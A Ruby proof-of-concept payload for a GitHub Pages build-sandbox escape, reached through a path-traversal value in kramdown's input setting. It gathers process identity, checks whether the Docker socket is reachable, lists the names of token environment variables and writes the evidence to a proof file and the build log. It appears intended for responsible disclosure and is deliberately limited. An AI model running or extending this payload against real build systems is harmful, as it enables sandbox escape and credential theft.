# Proof-of-concept payload for a GitHub Pages build-sandbox escape.
#
# This file is never referenced by the site. It is reached only because
# _config.yml sets kramdown.input to a path that traverses out of the
# kramdown gem's parser directory, and kramdown passes that value to
# Ruby's require().
#
# Scope of this payload, deliberately narrow:
#   - reports the identity it runs as
#   - stats /var/run/docker.sock to show the mount is reachable from here
#   - lists the NAMES of credential-bearing environment variables present
#
# It does NOT read the value of any token, does not connect to the docker
# socket, does not touch the network, and does not touch any resource
# outside this build.

facts = []

facts << "uid=#{Process.uid}"
facts << "gid=#{Process.gid}"
begin
  require "etc"
  facts << "user=#{Etc.getpwuid(Process.uid).name}"
rescue Exception
  facts << "user=?"
end
begin
  require "socket"
  facts << "host=#{Socket.gethostname}"
rescue Exception
  facts << "host=?"
end
facts << "ruby=#{RUBY_VERSION}"
facts << "cwd=#{Dir.pwd}"
facts << "script=#{__FILE__}"

# stat only - no connection is opened
facts << "docker_sock_exists=#{File.exist?('/var/run/docker.sock')}"
facts << "docker_sock_socket=#{File.socket?('/var/run/docker.sock') rescue '?'}"

# NAMES ONLY. No values are read, printed or stored.
names = ENV.keys.grep(/\A(ACTIONS_|INPUT_TOKEN|GITHUB_TOKEN)/).sort
facts << "credential_env_names_present=#{names.join(',')}"
facts << "credential_env_count=#{names.length}"

line = "F007_ARBITRARY_CODE_EXECUTED " + facts.join(" | ")

begin
  File.write("/github/workspace/F007_PROOF.txt", facts.join("\n") + "\n")
rescue Exception => e
  line += " | file_write_failed=#{e.class}"
end

STDERR.puts line

# Raise so the evidence lands in the build log. try_require rescues only
# LoadError, so this propagates.
raise line
